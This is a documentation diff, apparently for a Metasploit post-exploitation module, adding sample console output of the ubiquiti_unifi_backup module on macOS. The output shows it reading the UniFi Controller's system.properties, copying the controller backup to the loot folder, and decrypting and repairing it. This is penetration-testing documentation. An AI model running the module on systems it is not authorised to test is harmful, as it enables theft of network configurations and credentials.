@@ -181,3 +181,19 @@ host           service  type                                      name          
 4.4.4.4                 ubiquiti.unifi.backup_decrypted           5.10.19.unf.broken.zip                                        application/zip  Ubiquiti Unifi Controller Decrypted Broken Backup Zip  /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_661494.zip
 4.4.4.4                 ubiquiti.unifi.backup_decrypted_repaired  5.10.19.unf.zip                                               application/zip  Ubiquiti Unifi Controller Backup Zip                   /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_212269.zip
 ```
+
+### Ubiquiti Unifi Controller 5.10.20 on OSX 10.14.4
+
+#### Module
+
+```
+msf5 post(multi/gather/ubiquiti_unifi_backup) > rexploit
+[*] Reloading module...
+
+[+] Read UniFi Controller file /Users/unifi/Library/Application Support/Unifi/data/system.properties
+[+] File /Users/unifi/Library/Application Support/UniFi/data/backup/5.10.20.unf saved to /root/.msf4/loot/20190406110342_default_1.1.1.1_ubiquiti.unifi.b_683102.unf
+[+] File 5.10.20.unf DECRYPTED and saved to /root/.msf4/loot/20190406110342_default_1.1.1.1_ubiquiti.unifi.b_122303.zip.  File needs to be repair via `zip -FF`
+[*] Attempting to repair zip file (this is normal)
+[+] File /Users/unifi/Library/Application Support/UniFi/data/backup/5.10.20.unf DECRYPTED and REPAIRED and saved to /root/.msf4/loot/20190406110342_default_1.1.1.1_ubiquiti.unifi.b_728913.zip.
+[*] Post module execution completed
+```
